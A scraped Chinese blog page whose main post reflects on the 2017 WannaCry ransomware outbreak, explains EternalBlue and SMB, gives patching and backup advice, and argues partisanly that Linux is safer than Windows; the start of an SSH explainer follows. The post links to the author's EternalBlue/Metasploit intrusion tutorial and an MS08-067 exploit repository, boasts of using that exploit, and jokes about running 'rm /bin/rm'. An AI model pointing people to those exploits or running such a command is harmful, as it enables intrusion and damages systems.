  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/05/14/wanna-cry/index/">Wanna Cry勒索病毒事件随想</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>这波WannaCry可能过去了，但是据安全人员研究称，<a target="_blank" rel="noopener" href="https://github.com/stamparm/EternalRocks/">新的一波EternalRocks即将到来</a>，现阶段此蠕虫没有采取勒索行为而是试图创建僵尸网络。不同于WannaCry只使用了Eternalblue，EternalRocks使用了NSA的SMB漏洞利用程序EternalBlue, EternalChampion, EternalRomance,EternalSynergy，还有相关的程序DoublePulsar（用于注入dll或者运行shellcode）, ArchiTouch（判断目标系统的架构）SmbTouch（判断可以被利用的SMB漏洞）。</p>
<p>我们……不哭，起来，再撸 [v_error]那个啥，先说下呗，使用Windows的小伙伴，别想你是Windows几了，尽可能的<strong>开自动更新</strong>吧，顺便<strong>关了SMB服务</strong>吧，然后再养成<strong>备份文件</strong>的好习惯噢（不如试试dropbox）。备份不做，十恶不赦啊！时刻感觉自己要被人谋害这才对嘛(_ _)( - . - )逃[&#x2F;v_error]</p>
<p>根据EternalBlue的说明，目前可以受到攻击的系统有XP、Server 2008和Windows7；我今早测试貌似Windows 10（1511）不受此漏洞的影响，可能是我测试方法有误，但是依旧小心为妙吧！</p>
<p>关注本博客的朋友们可能会发现，三个多星期之前我根据歪果仁的论文写了一篇<a target="_blank" rel="noopener" href="https://dmesg.app/shadowbroker.html">《使用EternalBlue, doublepulsar, metasploit渗透Windows》</a>的文章，那时候ShadowBroker刚刚公布NSA黑客工具一个星期，MS17-010都公布接近一个月了。没想到一个月之后，竟然有人根据这漏洞搞出来蠕虫大规模入侵内网（那个……我拿着08年的netapi也干了不少事），同时又看到很多哭笑不得的言论，什么别以为Mac就安全了什么Linux的。童鞋们啊，多读书，尽可能的进行<strong>批判性思维和独立思考</strong>真的很重要啊。 由于本文主要会集中讨论一下Windows和Linux的问题，这就好像问一个程序员，你是用vim还是Emacs，<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%90%89%E5%93%88%E5%BE%B7">jihad</a>啊！所以，我会尽量避免这些问题，争取避免片面思维。 咱本篇主要讨论的是服务器和桌面的Windows与Linux，当然在开始之前，咱们有必要普及几个技术术语，毕竟，咱的写作目标是科普嘛！</p>
<h2 id="啥是比特币"><a href="#啥是比特币" class="headerlink" title="啥是比特币"></a>啥是比特币</h2><p>不同于一般货币拥有载体（实物）、中央发行机构，比特币是一种<strong>没有载体</strong>（实物）的、<strong>没有发行机构</strong>的、<strong>去中心化</strong>电子货币。由于其采用密码技术来控制货币的生产和转移，而没有中央的发行机构，无法任意增发，交易由整个网络进行验证，因此比特币也被认为是一种电子加密货币 ，由于其有特殊的隐秘性，加上不必经过第三方金融机构，因此除了重视隐私的用户外，也经常被拿来当作非法交易的媒介，比如说在<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%9A%97%E7%BD%91">暗网</a>上干点坏事啦，都是用比特币的。 使用比特币最大的特点就是<strong>很难溯源</strong>，在<strong>技术层面上</strong>你不知道这个比特币账户背后的人究竟是谁，因此也特别适合那些“黑客们”。 比特币有多值钱呢？现在1比特币已经大概等值于1700USD了，挺值钱的，要是我在初中的时候知道这东西搞几个就好了……</p>
<h2 id="啥是勒索病毒"><a href="#啥是勒索病毒" class="headerlink" title="啥是勒索病毒"></a>啥是勒索病毒</h2><p>就是吧，有一种恶意的计算机程序，它控制你的电脑之后，会用某种加密算法加密你的部分甚至是全部文件，之后向你索要赎金来解密；类似的事情不仅发生在桌面、服务器上，有些数据库被脱下来之后也会这样索要比特币。 由于密码学的一些原因，咱想不交钱解密可能比较难（咱不会逆向，不过咱可以想万一这个病毒制作者的加密密钥是硬编码在软件中的呢，应该没这么智障吧），所以咱要支付赎金吗？当然不要了，那不是助纣为虐么！谁敢保证“黑客”一定会有良心！话说回来，那勒索工具需要Tor？那完了哈哈哈还得挂代理啊真是悲剧；中文版据说是Google Translate的？Google Translate这么牛逼了？</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/05/2017051411330961.png"><img src="/images/2017051411330961-1024x768.png"></a></p>
<p>需要tor才能解密，来源<a target="_blank" rel="noopener" href="https://twitter.com/chenshaoju/status/863602735257493504">陈少举Twitter</a></p>
<p>在一两年前我还玩新浪微博的时候，看到字幕组里一个人的朋友的电脑被这样的病毒搞了，应该使用了巨慢无比的RSA，哎，看来这事还是层出不穷呢。</p>
<h2 id="EternalBlue又是个啥"><a href="#EternalBlue又是个啥" class="headerlink" title="EternalBlue又是个啥"></a>EternalBlue又是个啥</h2><p>就是嘛，美国有一个巨牛逼巨可恶的机构叫做<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%BE%8E%E5%9B%BD%E5%9B%BD%E5%AE%B6%E5%AE%89%E5%85%A8%E5%B1%80">NSA</a>国家安全局，对就是爆光<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%A8%9C%E9%8F%A1%E8%A8%88%E7%95%AB">棱镜计划</a>的主角<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%88%B1%E5%BE%B7%E5%8D%8E%C2%B7%E6%96%AF%E8%AF%BA%E7%99%BB">斯诺登</a>曾经就职的那个地方；说NSA巨牛逼是因为NSA技术实力其实蛮强的，说NSA巨可恶是因为他们净想着以各种名义来做各种侵犯人权的事情。话说有另一个黑客组织叫影子经纪人（The Shadow Brokers ），他们竟然从NSA手里吧Equation Group的黑客工具偷出来了。那堆黑客工具中有一系列叫做Eternal啥的，包括<code>EternalBlue，EternalRomance，EternalRomance</code>啥的，听这名咱就能直到NSA那群人是多么的骄傲啊竟然把这玩意叫Eternal永恒的？ 在这对工具中啊最好用的基本上就是EternalBlue了，EternalBlue可以通过开放445端口（提供<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%BC%BA%E6%9C%8D%E5%99%A8%E8%A8%8A%E6%81%AF%E5%8D%80%E5%A1%8A">SMB服务</a>，SMB是啥？简单理解你在网上邻居里看到同局域网的电脑那就算SMB好吧）来远程执行代码，其中可以被入侵的目标包括XP、Server 2008&#x2F;7，咦竟然没有Server 2003？没事咱有<a target="_blank" rel="noopener" href="https://github.com/BennyThink/ms08-067_Server_2003_Chinese_Version">ms08-067的netapi</a>啊……</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/05/2017051411335554.png"><img src="/images/2017051411335554.png"></a></p>
<p>总结就是一句话，EternalBlue非常强大，强大到只要知道一个IP地址就能够植入后门，颇有当年ms08-067的风范啊……</p>
<h2 id="啥是零日漏洞（0day）、未公开漏洞"><a href="#啥是零日漏洞（0day）、未公开漏洞" class="headerlink" title="啥是零日漏洞（0day）、未公开漏洞"></a>啥是零日漏洞（0day）、未公开漏洞</h2><p>咱字幕组做字幕啊，分成好几种，一种叫0day，就是当天必须翻译完压制完的；还有1day，就是第二天翻译完。类比下，假如某个系统的某个漏洞的细节被公开，他们可以在24小时之内制作出相应的攻击代码。而这个时候，软件厂商多半还没来得及发布补丁。那么这些攻击者就可以利用这个时间差，进行入侵活动。所以，这种漏洞称为“<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%9B%B6%E6%97%A5%E6%94%BB%E5%87%BB">零日漏洞</a>”（Zero-Day, 0-Day）。 类似0day有一种说法叫做“未公开漏洞”，这俩概念比较接近，“零日漏洞”可利用的时间段会短一些，比较负责任的软件厂商通常会比较快发布补丁（当然也有例外，比如那个Oracle啊）；未公开漏洞就是没公开给厂商、但是却有漏洞利用程序的，咱可以说NSA这堆在没被公开之前就属于未公开漏洞。 咱能发现，未公开漏洞要危险的多。NSA在2011年就有了这堆工具(根据文件的时间戳)，这都17年了，想想就可怕。 好了咱说了一大堆啥是，大概让大家对背景有了些了解。</p>
<h2 id="勒索病毒是咋扩散的这么快的啊"><a href="#勒索病毒是咋扩散的这么快的啊" class="headerlink" title="勒索病毒是咋扩散的这么快的啊"></a>勒索病毒是咋扩散的这么快的啊</h2><p>鉴于巨硬的Windows 7是如此成功、优秀的一款操作系统，大家应该都使用过吧？但是很多人应该发现只要自己那么一关机啊，它就给你更新更新更新，有的时候还更新失败，巨烦无比！在Windows 10上这个问题貌似得到了一些改善。所以呐有很多人，为了防止被这个更新折磨致死，就把它关掉了（坦言我也曾经给自己的自动更新关掉），于是乎巨硬推送的安全更新就不会自动安装了，恰巧SMB默认是开启的、EternalBlue攻击执行远程代码成功率奇高，在加上很多政府组织、公司、学校内网的Windows配置都是一样的，网管还很懒，这天时地利人和加一起就导致了像传染病一样的传播。</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/05/2017051411342843.png"><img src="/images/2017051411342843.png"></a> 被攻击的学校机房，来源<a target="_blank" rel="noopener" href="https://twitter.com/BattlerHenry/status/863273070097612805">猫箱内の巴托拉-BattlerHenry</a></p>
<p>提到政府组织、公司、学校的安全策略，其实有一些会对外来攻击防范的比较好，但是对于内网发起的攻击却不那么在乎；有些则是内外都不在乎，比如说我学校，网管懒死了！</p>
<h2 id="Linux对于此次病毒攻击的防范"><a href="#Linux对于此次病毒攻击的防范" class="headerlink" title="Linux对于此次病毒攻击的防范"></a>Linux对于此次病毒攻击的防范</h2><p>据国外安全研究人员报道，此病毒的变种版本2.0可以在wine下感染文件，但是还请各位Linux用户放心……原因待我一一道来。</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/05/2017051511222426.png"><img src="/images/2017051511222426.png"></a></p>
<p>图片来源：<a target="_blank" rel="noopener" href="https://twitter.com/hackerfantastic/status/863359375787925505">Hacker Fantasic称</a></p>
<h3 id="原因之一：wine-x2F-Linux默认不带有smb服务"><a href="#原因之一：wine-x2F-Linux默认不带有smb服务" class="headerlink" title="原因之一：wine&#x2F;Linux默认不带有smb服务"></a>原因之一：wine&#x2F;Linux默认不带有smb服务</h3><h3 id="原因之二：就算带，EternalBlue也只是针对有漏洞的smb实现发起攻击（7-x2F-2008-x2F-XP）"><a href="#原因之二：就算带，EternalBlue也只是针对有漏洞的smb实现发起攻击（7-x2F-2008-x2F-XP）" class="headerlink" title="原因之二：就算带，EternalBlue也只是针对有漏洞的smb实现发起攻击（7&#x2F;2008&#x2F;XP）"></a>原因之二：就算带，EternalBlue也只是针对有漏洞的smb实现发起攻击（7&#x2F;2008&#x2F;XP）</h3><p>以上两个原因就已经能够保证Linux就像<strong>打了疫苗一样对病毒的传播是免疫</strong>的，但是哪怕某个用户脑残在Linux下收到了病毒的exe、并且还装有wine、并且还双击了……</p>
<h3 id="原因之三：wine的一些对于Windows-API、dll不完善的封装可能会导致某些版本的病毒运行失败"><a href="#原因之三：wine的一些对于Windows-API、dll不完善的封装可能会导致某些版本的病毒运行失败" class="headerlink" title="原因之三：wine的一些对于Windows API、dll不完善的封装可能会导致某些版本的病毒运行失败"></a>原因之三：wine的一些对于Windows API、dll不完善的封装可能会导致某些版本的病毒运行失败</h3><p>找不到入口点，无法加载某个dll，唉，当个病毒也不容易啊。</p>
<h3 id="原因之四：退一步讲，wine只对-有读写权限，万一走了狗屎运也只是自己的-被加密"><a href="#原因之四：退一步讲，wine只对-有读写权限，万一走了狗屎运也只是自己的-被加密" class="headerlink" title="原因之四：退一步讲，wine只对~有读写权限，万一走了狗屎运也只是自己的~被加密"></a>原因之四：退一步讲，wine只对<code>~</code>有读写权限，万一走了狗屎运也只是自己的<code>~</code>被加密</h3><p>默认wine会把<code>~/.wine/driver_c</code>映射为C盘，把<code>/</code>映射为Z盘，然而普通用户对<code>/</code>没有w权限，用root权限运行wine的当我啥也没说。</p>
<p>所以总结这四个原因就是，Linux对此病毒的传染是免疫的、哪怕此病毒破坏力再强再跨平台，只要你不运行，那就没事……这就好似某人发明了一款蟑螂药，管它美洲蟑螂还是火星机械蟑螂吃了肯定会死，但是你得掰开蟑螂嘴喂它才行……???</p>
<p>请注意，5月26日，Samba近日发布了4.6.4版本，该版本修复了一个严重的远程代码执行漏洞（漏洞编号：CVE-2017-7494），Samba 3.5.0 和包括4.6.4&#x2F;4.5.10&#x2F;4.4.14中间的版本均在受影响之列</p>
<h2 id="先谈谈预防措施"><a href="#先谈谈预防措施" class="headerlink" title="先谈谈预防措施"></a>先谈谈预防措施</h2><p>值得庆幸的是，我所在的学校并没有被此次蠕虫波及（但是我学校的网络安全防护差到不敢想想），昨天也发现身边的一些朋友在分享这条消息。然而我敢打赌，大家都是看完了就看完了就像<strong>看了笑话一样以为一切和自己毫无关系</strong>，很少有人会立刻开电脑进行安全加固吧？所以万万不可掉以轻心，EternalBlue成功率高到可以手动十分钟一台…… 所以至少要未雨绸缪嘛，羊还没丢啊！我们需要做的事情的<strong>安装ms17-010安全更新（巨硬都给XP和2003这个更新了），关闭SMB服务，养成备份文件的好习惯。</strong> 当然了那些使用Mac（并且安装使用的是OS X）、Linux发行版的用户就别管了，与你们无关。 说句题外话，昨天我从外面回来，室友忧心忡忡的问我：这个没事吧我都不敢连锐捷了。我说你别急，等我扫下你的电脑看看开没开445哈……</p>
<h2 id="已经中招了咋办"><a href="#已经中招了咋办" class="headerlink" title="已经中招了咋办"></a>已经中招了咋办</h2><p>那些已经中招的小伙伴，唉，一定不要交赎金啊，还得带tor，目前根据一些安全人员的逆向研究，也没啥太管用的恢复文件的办法，也不知道这玩意变异了几个版本，目前我搜集到的稍微靠谱点的信息有：</p>
<p>1.使用数据恢复工具恢复文件（因为这家伙是在内存中加密再删除源文件的），至于用其他人的比特币记录忽悠始作俑者，还是算了吧……</p>
<p>2.XP用户可以试试一个安全人员利用XP中CryptoAPI实现缺陷来取得加密密钥，<a target="_blank" rel="noopener" href="https://github.com/aguinet/wannakey">戳我</a></p>
<p>好哒，咱说了这么多题外话，终于到转入正题了，为啥无论是在桌面上还是服务器上（甚至是移动设备上），Linux要比Windows在安全性上做的更好啊。当然了，我这样是在引战，Linux也有过dirty cow，OpenSSL也有过heartbleed，但是就如小蜗牛童鞋所言：</p>
<blockquote>
<p>若无力驾驭，自由便是负担</p>
</blockquote>
<p>为了避免打口水战，咱要提的第一个先决条件就是：适用性</p>
<h2 id="适用性"><a href="#适用性" class="headerlink" title="适用性"></a>适用性</h2><p>众所周知，当今世界是一个开放的、经济全球化的世界，想要闭关锁国那是不行滴（包包：啥？）！软件也如此，很多软件现在都开始是跨平台并且设计为<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%9B%BD%E9%99%85%E5%8C%96%E4%B8%8E%E6%9C%AC%E5%9C%B0%E5%8C%96">i18n</a>，当然也有一些例外，比如说大部分游戏都只有Windows版本的，这咱不能wine一个吧（其实也不是不行……wine2.0能跑使命召唤4你敢信？） 咱所说的适用性就是，有些服务器必须要使用Windows，最常见的就是那些游戏服务器；有些必须要使用Linux，有些则是二者均可。咱要说Linux和Windows都<strong>有各自的适用性</strong>，只不过在服务器领域，Linux是占有大部分优势的；在桌面领域，Linux的优势似乎没那么大…… 咱主要说的就是最后这二者均可的。</p>
<h2 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h2><p>首先咱要知道，Linux就是个内核，只有内核那是不成的，所以还需要套上一大堆东西才能成为今天咱用的发行版。根据包管理器的不同，Linux发行版可以大体分成deb系和rpm系，还有其他的比如Arch、Gentoo啥的。 大家可以戳去<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Linux%E5%8F%91%E8%A1%8C%E7%89%88%E5%88%97%E8%A1%A8#/media/File:Linux_Distribution_Timeline.svg">维基百科</a>来看看所有发行版的时间线，咱能发现这简直太多太多了好吧。</p>
<h3 id="Linux发行版数量这么多，有啥好处呢？"><a href="#Linux发行版数量这么多，有啥好处呢？" class="headerlink" title="Linux发行版数量这么多，有啥好处呢？"></a>Linux发行版数量这么多，有啥好处呢？</h3><p>其一对于咱用户来说，选择的余地太多啦！苦了那些选择纠结症的童鞋 其二，发行版数量多也直接减少了攻击面，不同的发行版，其体系可能会差非常多。预装的软件不同，内核版本也不同，甚至是内核的编译参数、运行参数都不同，你这让攻击者情何以堪啊——目标都无法确定攻击个毛啊。 相反咱看看Windows，总共也就那么几个版本，像Windows 7有Professional、Home、Ultimate，反正双手双脚大概是差不多输得过来了，尽管数的过来，但实际上这些版本是没啥差别的。为啥呢？因为Windows的核心组件都是基本不变的，比如这几个版本都有IE，那个巨慢无比漏洞百出的IE。</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/05/201705141135249.jpg"><img src="/images/201705141135249.jpg"></a></p>
<p>被嘲讽的IE，来源见水印</p>
<h3 id="Linux发行版的可定制性"><a href="#Linux发行版的可定制性" class="headerlink" title="Linux发行版的可定制性"></a>Linux发行版的可定制性</h3><p>咱说，Linux非常灵活、简洁，咱可以重新编译内核来去掉很多用不到的模块，咱可以删掉很多用不到的软件包，这样就直接减小了攻击面。活这么大，我还没听说过谁能够自己编译Windows的内核呢，Mac OS的内核虽说也是开源的，但是想要自己编译，似乎还是有些难度的。</p>
<h3 id="Linux发行版对于硬件的丰富支持"><a href="#Linux发行版对于硬件的丰富支持" class="headerlink" title="Linux发行版对于硬件的丰富支持"></a>Linux发行版对于硬件的丰富支持</h3><p>《计算机原理》没挂科的童鞋们大概知道CPU有很多架构吧，什么x86啊，x86_64啊，ARM啊，MIPS啊，PowerPC啊……反正是超多CPU架构的，Windows可没有这么多。 支持这么多、对于安全性来说，有啥好处呢？不知道大家是否听过这样的新闻：XX处理器爆出XXX漏洞，硬件漏洞也是可能的。支持的硬件更多可以有效的降低“被盯上”的可能性，这么多谁知道你用的是啥处理器嘛。</p>
<h3 id="Linux用户更小众"><a href="#Linux用户更小众" class="headerlink" title="Linux用户更小众"></a>Linux用户更小众</h3><p>我相信所有人都会一致认为，在桌面上，三大系统使用率是Windows&gt;Mac OS<strong>&gt;&gt;<strong>Linux，所以这也避免了“树大招风”的效应。毕竟，如果想要开发对应的漏洞利用程序，就要付出更多的资源来针对使用率最广泛的系统，也就是Windows咯。 不过一定要注意，桌面Linux之所以要安全，用户数量少只是</strong>其中的原因之一</strong>，Linux的安全是<strong>从本质上优越于</strong>Windows的。全球Linux（包括服务器和桌面）用户可不少，Android的用户量早就超过了Windows，可是Android和Linux可并没有像Windows那样病毒泛滥成灾，所以千万不要犯本末倒置的逻辑谬误。</p>
<h3 id="Linux有完善的包管理器机制"><a href="#Linux有完善的包管理器机制" class="headerlink" title="Linux有完善的包管理器机制"></a>Linux有完善的包管理器机制</h3><p>大家在用Windows的时候，是咋么安装软件的，肯定是这么几个步骤吧：打开百度啥，搜索XX软件，从广告中分辨出真正的官方网站，到某个网站，从广告中分辨出真实的下载地址，下载，安装，使用。 上述步骤中可能存在有非常多的问题，比如说：万一你去的网站不是https的，下载链接被劫持了呢？万一那个网站本身就给加了后门啥的呢？（参见<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/zh-hans/XcodeGhost%E9%A3%8E%E6%B3%A2">XGhost Code事件</a>） 还有一点，Windows下有些软件的自动更新也存在一些问题，有些的自动更新渠道不是加密的、并且不会对下载之后的文件进行校验，大名鼎鼎的<a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2016/08/Trojan-Horse-DCM.html">黑暗幽灵</a>是怎么来的，嘿嘿。 烦死人了嘛！但是在Linux下，咱不用这么做，因为有软件包管理器啊，软件包管理器有啥好处呢，除了方便快捷之外？ <strong>安全的签名机制：</strong>咱不用担心源里面的软件是被篡改的、下载过程中被篡改了，它会直接拒绝安装。因为完善的包管理器都会有一些机制来校验，有些是使用散列函数、有些是数字签名，有些是这二者结合。 <strong>升级更新机制：</strong>当软件包的维护者开发完新的版本并测试之后（可能是功能更新，可能是bug fix，也可能是安全更新），他可以把新的版本推送到源，包管理器也会有对应的自动更新机制（尤其是服务器版）。咱晓得，使系统随时保持最新状态可以集大程度降低被攻击的风险</p>
<h3 id="Linux的文件权限遏制了病毒的扩散"><a href="#Linux的文件权限遏制了病毒的扩散" class="headerlink" title="Linux的文件权限遏制了病毒的扩散"></a>Linux的文件权限遏制了病毒的扩散</h3><p>话说土豆我当初在学习Linux的时候，最头疼的问题就是，rwx权限有毛用啊！更别提还有<code>suid、sgid、sticky bit</code>了，简直头疼。那时候我还年轻呐！ 呐，咱知道，在Windows下，一个程序能不能运行，是看扩展名滴！只要扩展名是exe那么就是能够运行的（这里的能够运行是指的操作系统能够给它可执行的能力，而不是能否工作，咱把一个txt改成exe当然是没办法运行出来hello world的），不知道大家中没中过U盘病毒啊嘻嘻嘻。 [v_tips]注： 有些人可能会说了，Windows也有类似的文件权限体系啊，比如说NTFS的ACL啥的……那个，是这么个理，只不过俺至今不会配置那玩意（太费事了太繁琐了），而且U盘基本上都格式化为FAT之类的文件系统，FAT天生不支持文件权限，没戏！[&#x2F;v_tips]</p>
<p>但是在Linux下，一个程序能不能运行是靠的x权限的，扩展名并不是判定因素。再由于默认的<code>umask</code>是022，本来一个文件就是没有x权限的了，唉~ <a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/05/2017051411355453.png"><img src="/images/2017051411355453.png"></a></p>
<p>没有x权限，你是运行不了滴！咦，暴露了我电脑型号。</p>
<p>还有一些其他的有助于Linux安全的因素，比如说开源有助于安全审查，社区维护可以避免商业公司侵犯用户隐私，这里就不提了。 不过，咱得说，Linux也曾经爆出过很多非常严重的漏洞，包括其他的一些非常关键的开源项目（比如说OpenSSL）也爆出过漏洞。但是咱得承认，Windows漏洞的修复速度、漏洞潜伏期往往都比较慢的……</p>
<h2 id="价格"><a href="#价格" class="headerlink" title="价格"></a>价格</h2><p>没错哒，那么多发行版基本上咱都可以拿来免费用，不用给他们一毛钱！呐，有人也许会问，那些靠着发行版活着的商业公司是怎么赚钱的啊？软件免费，服务收钱呗~ 因为开源的性质，有很多发行版都适合做服务器，而Windows服务器是要给微软交钱的，所以你能看到国外有些vps, Windows服务器比Linux贵个几块钱（不过<a target="_blank" rel="noopener" href="https://dmesg.app/win2linux.html">腾讯云是个例外哈哈哈赚它30G硬盘</a>）</p>
<h2 id="稳定性、操作性、高性能"><a href="#稳定性、操作性、高性能" class="headerlink" title="稳定性、操作性、高性能"></a>稳定性、操作性、高性能</h2><p>Linux比较稳定，跑几个月甚至几年都不会挂也不需要重启，而且<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/KISS%E5%8E%9F%E5%88%99">KISS</a>：简洁，自定义程度高，更节约资源更高效，信不信我<code>rm /bin/rm</code>给你看? 服务器版的Linux都没有桌面环境，更节约内存，Windows的桌面环境怎么也得要二三百兆内存吧，而且Linux有很强大的shell，shell就能搞定一切，而管理Windows服务器则需要远程桌面，你再瞅瞅Windows的那个cmd..虽说微软新搞的powershell很强大，但是学习成本有点高。 文件系统的性能上ext4, btrfs, xfs都比Windows的NTFS好太多啦</p>
<p>Linux对硬件要求很低，而且也支持更多的CPU架构不用多大内存多大硬盘，有的在128M，64M内存都跑的起来(不信你搜搜puppy Linux, tiny core Linux人家还带桌面环境)，咱甚至可以通过重新编译内核等途径，精简不需要的模块来达到更好的效果，整体而言Linux的<strong>耦合度比较低</strong>，很多没必要的东西都能删掉，也照样跑的起来。而Windows是不可能做到这一点的，Windows的组件几乎都是没有选择的只能全装(比如说漏洞百出的IE，<strong>耦合度高</strong>的Windows自己都离不开)，再怎么精简也得是几百兆出头吧。 对于硬件要求低，在服务器上这一点优势更明显，咱家用PC可能都是GB级别的内存，但是<strong>服务器上多1G的内存就要多不少钱呢</strong>！干嘛要把本来就很珍贵的内存用来跑GUI呢，是吧！就算都跑GUI，咱还有LXDE、Xface这类轻量级的桌面环境可以选择嘛，照样虐杀瘟斗士。</p>
<h2 id="维护性"><a href="#维护性" class="headerlink" title="维护性"></a>维护性</h2><p>升级维护方面 Linux发行版都有包管理器，所以各种包很容易升级到最新版本。而且很多发行版都弱化版本号而采用<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%BB%BE%E5%8B%95%E7%99%BC%E8%A1%8C">滚动发行</a>的概念(那些不滚动的很多也都有用某个命令就可以升级到下一个LTS)，比如Arch、Kali，你再想想要是把server 2008升级成12，不得累死人 还有一点就是，Windows更改了配置啥的，很多情况下都得重启才行，但是Linux基本不用，有很多东西直接是修改内核参数的。甚至一些商业公司(redhat啊canonical)提供热补丁，不重启就能patch内核。</p>
<h2 id="标准和一些乱七八糟的"><a href="#标准和一些乱七八糟的" class="headerlink" title="标准和一些乱七八糟的"></a>标准和一些乱七八糟的</h2><p>呐，POSIX啊，咱比如说Linux都是用UTF-8的，全球通用，但是Windows就不是了，简体中文版是gbk,繁体中文是big5等等跟着不同语言版本的locale来的。UTF-8还给加个BOM，怪胎啊。</p>
<p> </p>
<h2 id="当然了……"><a href="#当然了……" class="headerlink" title="当然了……"></a>当然了……</h2><p>最近这几年，Windows也有了很大的改进，比如支持WSL，微软也开始拥抱开源，甚至收购了GitHub。一些娱乐性需求，Windows还是很吃香的:-)是不是</p>
<h2 id="随想与总结"><a href="#随想与总结" class="headerlink" title="随想与总结"></a>随想与总结</h2><p>介绍了这么多Linux的优点，其实避而不谈了一些缺点，比如说字体可能会有些问题（随着文泉驿、思源宋体等开源字体的发展，这个问题已经越来越少见了）、入门门槛比较高、某些桌面环境操作习惯不同、某些桌面环境兼容性稳定性有问题、娱乐游戏比较少，总之很多吧。但是呢，</p>
<p>对待这次蠕虫事件，咱得说遇见了好些逻辑谬误：本末倒置的以用户量多少作为衡量安全性的标准、阴谋论认为这是微软的阴谋等等、片面性的认为Linux使用范围只有服务器、打稻草人转移话题等等，俺是真的懒得说了……</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/05/14/wanna-cry/index/" data-id="clhp7rtn500b1s2qr4w59bu72" data-title="Wanna Cry勒索病毒事件随想" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-ssh-1/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/05/08/ssh-1/index/" class="article-date">
  <time class="dt-published" datetime="2017-05-08T00:00:00.000Z" itemprop="datePublished">2017-05-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/linux/">linux</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/05/08/ssh-1/index/">[SSH系列1]：什么是SSH、背景知识，SSH协议需求与设计难点</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p> </p>
<h2 id="前言：为啥要写这一系列"><a href="#前言：为啥要写这一系列" class="headerlink" title="前言：为啥要写这一系列"></a>前言：为啥要写这一系列</h2><p>几个星期之前小蜗牛童鞋写了一篇文章提到了SSH，但是其中引用的<a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html">阮一峰的博文</a>却有几处很明显的错误。<strong>无奈和感慨甚至是……愤恨之余</strong>，我顺便搜了下，好像大家都不是那么关注SSH，对SSH的原理更是知之甚少（貌似关注SSL&#x2F;TLS更多一些）。本着精益求精、顺便谈谈读书的问题，俺就只好亲自操刀写一系列文章，当然了我就是传说中的<strong>挖坑不填的超级不靠谱的人</strong>，我超级不负责说不定啥时候就给缩水了。</p>
<p>上一篇<a target="_blank" rel="noopener" href="https://dmesg.app/school-0.html">学校上网系列</a>还差个如何下载软件没有填（那个……某童鞋麻烦你从垃圾站下载个全家桶回来？），这一系列指不定会几个月填完。</p>
<p>所以嘛总结下来，别期待太多。</p>
<p>但咱今天就开始直接说正题吧，毕竟，给个甜头瞧瞧是不？</p>
<h2 id="本系列的目录"><a href="#本系列的目录" class="headerlink" title="本系列的目录"></a>本系列的目录</h2><p>1. 什么是SSH、背景知识，SSH协议需求与设计难点</p>
<p>2. SSH协议层次、架构的实现：连接，认证，传输</p>
<p>3. 来谈谈“学而不思则罔”</p>
<p>本篇我们主要谈论的问题有：什么是SSH、密码学背景知识，SSH协议需求与设计难点</p>
<h2 id="什么是SSH以及SSH的优点"><a href="#什么是SSH以及SSH的优点" class="headerlink" title="什么是SSH以及SSH的优点"></a>什么是SSH以及SSH的优点</h2><p>考虑到阅读本文的人应该知道什么是SSH，这里我也不费口水解释了，直接<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Secure_Shell">从维基百科上抄录如下</a>：</p>
<blockquote>
<p>Secure Shell（缩写为SSH），由IETF的网络工作小组（Network Working Group）所制定；SSH为一项创建在应用层和传输层基础上的安全协议，为计算机上的Shell（壳层）提供安全的传输和使用环境。</p>
<p>传统的网络服务程序，如rsh、FTP、POP和Telnet其本质上都是不安全的；因为它们在网络上用明文传送数据、用户帐号和用户口令，很容易受到中间人（man-in-the-middle）攻击方式的攻击。就是存在另一个人或者一台机器冒充真正的服务器接收用户传给服务器的数据，然后再冒充用户把数据传给真正的服务器。</p>
<p>而SSH是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用SSH协议可以有效防止远程管理过程中的信息泄露问题。通过SSH可以对所有传输的数据进行加密，也能够防止DNS欺骗和IP欺骗。</p>
<p>SSH之另一项优点为其传输的数据可以是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替Telnet，又可以为FTP、POP、甚至为PPP提供一个安全的”通道”。</p>
</blockquote>
<p>从中我们可以看到，SSH的优点是安全、加密，可以作为隧道协议来”包裹”其他不安全的协议。</p>
